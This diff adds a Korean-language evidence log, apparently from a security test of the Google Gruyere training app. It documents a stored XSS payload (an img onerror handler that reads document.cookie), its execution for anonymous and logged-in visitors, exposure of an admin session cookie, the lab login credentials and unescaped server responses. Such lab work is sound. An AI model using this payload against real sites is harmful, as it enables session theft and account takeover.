@@ -1,0 +1,24 @@
+# Round 4 — 저장형 XSS 브라우저(CDP) 실행 증거
+
+페이로드(스니펫 #1, brie 계정, newsnippet2 로 저장):
+<img src=x-nonexistent.png onerror="document.title='XSS-EXECUTED';var d=document.createElement('div');d.id='xss-proof';d.textContent='COOKIE='+document.cookie;document.body.appendChild(d)">
+
+## (A) 비인증 방문자 — /<gid>/snippets.gtl?uid=brie
+URL: https://google-gruyere.appspot.com/399820027374159079597995648128134925001/snippets.gtl?uid=brie
+document.title = "XSS-EXECUTED"        <- 페이로드가 JS 를 실행해 title 을 바꿈
+#xss-proof textContent = "COOKIE="       (비인증이라 쿠키 없음 — 실행은 됐다는 증거)
+document.querySelectorAll('[onerror]').length = 1
+→ 스크린샷: (세션 없는 방문자 화면, 스니펫 1번 자리에 깨진 이미지 아이콘 + 하단 'COOKIE=' 텍스트)
+
+## (B) 로그인한 피해자 — /<gid>/ (홈)
+로그인: /<gid>/login?uid=brie&pw=briebrie  → document.cookie = "GRUYERE=72819616|brie|admin|author"
+홈 URL: https://google-gruyere.appspot.com/399820027374159079597995648128134925001/
+document.title = "XSS-EXECUTED"
+#xss-proof textContent = "COOKIE=GRUYERE=72819616|brie|admin|author"
+→ **세션 쿠키가 그대로 XSS 로 읽혀 DOM 에 노출됨** (HttpOnly 부재)
+→ 스크린샷: evidence/round4_xss_cookie_theft_home.png (하단에 COOKIE=GRUYERE=72819616|brie|admin|author 가 렌더됨)
+
+## 서버 응답 원문(비인증 curl) — 이스케이프 여부
+/snippets.gtl?uid=brie  → <div id='0'><img src=x-nonexistent.png onerror="..."></div>  (그대로)
+/ (홈)                  → <span id='brie'><img src=x-nonexistent.png onerror="..."></span>  (그대로)
+/feed.gtl?uid=brie      → "...,"<img ... onerror="document.title='XSS-EXECUTED';...">",...  (JS 문자열 안의 " 가 이스케이프되지 않아 문자열 리터럴이 깨짐 = 저장형 JS 인젝션)
